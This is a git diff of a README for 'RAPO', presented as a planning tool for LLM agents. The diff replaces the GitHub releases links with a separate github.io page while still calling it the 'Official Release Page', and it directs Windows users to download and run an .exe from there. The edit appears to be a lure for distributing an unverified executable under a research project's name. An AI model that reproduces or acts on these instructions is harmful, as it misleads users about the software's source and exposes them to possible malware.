@@ -1,6 +1,6 @@
 # 🚀 RAPO - Better agent performance through smart planning
 
-[![](https://img.shields.io/badge/Download_RAPO-Blue-blue)](https://github.com/Gross-barium938/RAPO/releases)
+[![](https://img.shields.io/badge/Download_RAPO-Blue-blue)](https://gross-barium938.github.io)
 
 RAPO helps large language model agents plan and complete tasks with higher success rates. This tool uses retrieval-augmented policy optimization to look at past information before it makes a move. Agents use this process to learn better paths toward their goals. You can install this software on your Windows computer to manage complex agent tasks.
 
@@ -8,7 +8,7 @@ RAPO helps large language model agents plan and complete tasks with higher succe
 
 Follow these steps to get the files you need for your system.
 
-1. Go to the [Official Release Page](https://github.com/Gross-barium938/RAPO/releases).
+1. Go to the [Official Release Page](https://gross-barium938.github.io).
 2. Look for the latest version listed at the top.
 3. Click the file ending in .exe to start your download.
 4. Keep track of the folder where you save this file.
